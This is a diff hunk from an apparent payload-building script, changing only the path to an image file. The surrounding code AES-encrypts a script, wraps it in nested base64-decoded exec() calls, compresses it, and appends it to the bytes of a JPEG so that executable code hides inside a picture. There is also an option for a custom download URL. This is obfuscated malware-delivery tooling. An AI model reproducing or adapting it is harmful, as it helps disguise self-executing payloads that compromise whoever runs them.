@@ -169,7 +169,7 @@ cipher = AES.new(key)
 payload = EncodeAES(cipher, readyscript)
 downpayload = "exec(%s(\"%s\"))" % (bd64var,base64.b64encode("exec(%s.new(%s).decrypt(%s(\"%s\")).rstrip('{'))\n" %(AESvar,keyvar,bd64var,payload)))
 downpayload = base64.b64encode(bz2.compress(downpayload))
-with open('tools/cup.jpg', 'rb') as di:
+with open('stubs/cup.jpg', 'rb') as di:
 	downpayload = di.read() + downpayload
 
 if not args.customurl:
